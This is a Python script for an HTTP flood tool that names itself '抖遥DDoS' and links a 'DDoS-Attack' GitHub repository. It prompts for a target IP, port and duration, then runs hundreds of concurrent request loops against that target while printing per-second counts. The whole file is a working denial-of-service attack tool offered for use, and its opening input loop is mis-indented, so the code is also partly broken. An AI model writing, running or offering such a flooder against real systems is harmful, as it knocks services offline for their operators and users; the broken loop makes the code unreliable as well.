import asyncio
import httpx
from colorama import Fore, Style
import os

# 初始化统计数据
success_count = 0
failure_count = 0
lock = asyncio.Lock()

async def send_request(client, target_url, stop_event):
    """单个请求任务"""
    global success_count, failure_count
    while not stop_event.is_set():  # 检查停止事件
        try:
            response = await client.get(target_url, timeout=2)  # 调整超时时间
            if response.status_code == 200:
                async with lock:
                    success_count += 1
            else:
                async with lock:
                    failure_count += 1
        except httpx.RequestError:
            async with lock:
                failure_count += 1

async def print_stats(stop_event):
    """定时打印统计信息"""
    global success_count, failure_count
    while not stop_event.is_set():  # 检查停止事件
        await asyncio.sleep(1)  # 每 1 秒打印一次
        async with lock:
            success, failure = success_count, failure_count
            success_count = failure_count = 0  # 重置统计数据
        print(f"{Fore.GREEN}成功请求数: {success}{Style.RESET_ALL} | {Fore.RED}失败请求数: {failure}{Style.RESET_ALL}")

async def main():
    # 用户输入
    protocol = input(f"{Fore.CYAN}感谢使用抖遥DDoS，GitHub https://github.com/douyaobaby/DDoS-Attack 输入y或yes继续: {Style.RESET_ALL}").strip().lower()
       while protocol not in ("y", "yes"):
        print(f"{Fore.RED}无效输入，请输入 y 或 yes。{Style.RESET_ALL}")
    protocol = input(f"{Fore.CYAN}请选择协议 (http/https): {Style.RESET_ALL}").strip().lower()
    while protocol not in ("http", "https"):
        print(f"{Fore.RED}无效输入，请选择 http 或 https。{Style.RESET_ALL}")
        protocol = input(f"{Fore.CYAN}请选择协议 (http/https): {Style.RESET_ALL}").strip().lower()
        
    target_ip = input(f"{Fore.CYAN}请输入目标 IP 地址: {Style.RESET_ALL}")
    target_port = input(f"{Fore.CYAN}请输入目标端口: {Style.RESET_ALL}")
    duration = int(input(f"{Fore.CYAN}请输入测试持续时间（秒）: {Style.RESET_ALL}"))

    target_url = f"{protocol}://{target_ip}:{target_port}"  # 根据选择构造目标 URL
    print(f"{Fore.CYAN}开始测试目标: {target_url}{Style.RESET_ALL}")
    print(f"{Fore.YELLOW}测试持续时间: {duration} 秒{Style.RESET_ALL}")

    # 获取 CPU 核心数量
    cpu_count = os.cpu_count()
    print(f"{Fore.YELLOW}系统CPU核心数量: {cpu_count}{Style.RESET_ALL}")

    # 创建一个停止事件
    stop_event = asyncio.Event()

    # 启动高并发 HTTP 客户端
    async with httpx.AsyncClient() as client:
        tasks = [asyncio.create_task(send_request(client, target_url, stop_event)) for _ in range(cpu_count * 100)]  # 根据 CPU 核心数量设置并发请求数
        stats_task = asyncio.create_task(print_stats(stop_event))

        # 等待指定时间
        await asyncio.sleep(duration)

        # 设置停止事件
        stop_event.set()

        # 取消任务
        await asyncio.gather(*tasks, return_exceptions=True)
        await stats_task

        print(f"{Fore.BLUE}测试结束！{Style.RESET_ALL}")

if __name__ == "__main__":
    from colorama import init

    # 初始化颜色
    init(autoreset=True)

    # 运行主程序
    asyncio.run(main())